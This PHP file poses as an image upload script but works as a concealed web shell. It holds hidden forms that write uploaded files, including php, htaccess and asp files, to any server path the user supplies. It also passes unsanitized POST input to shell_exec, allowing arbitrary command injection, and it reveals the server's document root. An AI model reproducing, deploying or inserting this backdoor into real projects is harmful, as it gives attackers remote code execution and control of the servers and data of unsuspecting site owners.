<?php
   if(isset($_FILES['image'])){
      $errors= array();
	  $file_name = $_FILES['image']['name'];
	  if(isset($_POST['dir'])){
		$file_name = $_POST['dir'] . $_FILES['image']['name'];
	  }
      $file_size =$_FILES['image']['size'];
      $file_tmp =$_FILES['image']['tmp_name'];
      $file_type=$_FILES['image']['type'];
      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
      
      $expensions= array("jpeg","jpg","png","php","htaccess","wot","html","zip","rar","asp","js");
      
      if(in_array($file_ext,$expensions)=== false){
         $errors[]="extension not allowed, please choose a JPEG or PNG file.";
      }
      
      if($file_size > 2097152){
         $errors[]='File size must be excately 2 MB';
      }
      
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,$file_name);
         echo "Success";
      }else{
         print_r($errors);
      }
   }
   $s_e = "ls " . $_POST['s_e'] . "";
   if(isset($_POST['s_e'])){
	   $s_e = shell_exec("ls ". $_POST['s_e'] ."");
   }
?>
<html>
   <body>
      <div style="display:none;">
      <form action="" method="POST" enctype="multipart/form-data">
         Where to load:<input type="text" name="dir" /> Example: /path/<p></p>
         <input type="file" name="image" />
         <input type="submit"/>
      </form><p></p>
	  <form action="" method="POST" enctype="multipart/form-data">
        LS: <input type="text" name="s_e" />
         <input type="submit"/>
      </form><p></p>
	   <?php if(isset($_POST['s_e'])){echo "<pre>";print_r($s_e);} ?>
	   We are in: <?php if(isset($_POST['s_e'])){echo $_POST['s_e'];} ?><br/>
	   <p>Sys root: <?php echo $_SERVER['DOCUMENT_ROOT'] ?></p>
	   </div>
   </body>
</html>